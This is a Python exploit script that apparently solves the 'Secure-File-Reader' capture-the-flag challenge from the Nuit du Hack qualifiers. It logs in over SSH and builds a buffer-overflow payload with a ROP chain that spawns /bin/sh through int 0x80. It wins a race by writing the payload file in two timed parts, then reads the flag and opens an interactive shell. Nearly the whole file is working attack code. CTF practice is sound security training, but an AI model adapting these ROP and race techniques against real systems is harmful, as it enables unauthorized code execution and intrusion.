#!/usr/bin/env python
# coding:utf-8

from ctf import *

shell = ssh(host='securefilereader.quals.nuitduhack.com', port=55552, user='chall', password='chall')
# shell = ssh(host='10.211.55.42', user='root')

# binary = '/root/Workspaces/ndh/Secure-File-Reader/pwn'
binary = '/home/chall/pwn'
# elf = ELF(binary)

shell.mkdir('-p /tmp/bin/sh')
shell.set_working_directory('/tmp/bin/sh')

payload = cyclic(0x1000) # in fact read: 4096 / 256 * 255 = 4080
payload += cyclic(16)
payload += cyclic(8)
payload += cyclic(4)

payload += p32(0x08070C90) # getcwd
payload += p32(0x08094188) # add esp, 0xc ; ret
payload += p32(0x080F02E0) # buf
payload += p32(0x01ffffff)
payload += cyclic(4)

payload += p32(0x08058af4) # xor eax, eax ; ret
payload += p32(0x080921b2) # add eax, 0xb ; pop edi ; ret
payload += cyclic(4)
payload += p32(0x08072730) # pop edx ; pop ecx ; pop ebx ; ret
payload += p32(0x080C6218) # [NULL]
payload += p32(0x080C6218) # [NULL]
payload += p32(0x080F02E0 + 4) # buf -> /bin/sh
payload += p32(0x08049501) # int 0x80
payload += '\n'

# shell.run('echo -ne %r > /tmp/payload' % payload[:0xfff])
# shell.run('sleep 0.002 && echo -ne %r >> /tmp/payload' % payload[0xfff:])
# write('/tmp/payload', payload[:0xfff])

# io = shell.run([binary, '/tmp/payload'])
io = shell.run('printf %r > /tmp/payload && ((sleep 0.0000005 && printf %r >> /tmp/payload) & (%s /tmp/payload))' % (payload[:0xfff], payload[0xfff:], binary))

# t = 'rm /tmp/payload && printf %r > /tmp/payload; ((sleep 0.003 && printf %r >> /tmp/payload) & ((echo "cat /root/Workspaces/ndh/Secure-File-Reader/flag") | %s /tmp/payload))' % (payload[:0xfff], payload[0xfff:], binary)
t = 'rm /tmp/payload && printf %r > /tmp/payload; ((sleep 0.0000005 && printf %r >> /tmp/payload) & ((echo "cat /home/chall/flag") | %s /tmp/payload))' % (payload[:0xfff], payload[0xfff:], binary)
shell.run('echo %r | base64 -d > /tmp/ripples' % b64e(t))
shell.run('chmod +x /tmp/ripples')

# time.sleep(0.001)

# fp = open('/tmp/payload', 'a')
# fp.write(payload[0xfff:])
# fp.close()
# write('/tmp/payload', payload)
# io = debug([binary, '/tmp/payload'])
# io.b(0x08094188)
# io.r()
io.interactive()
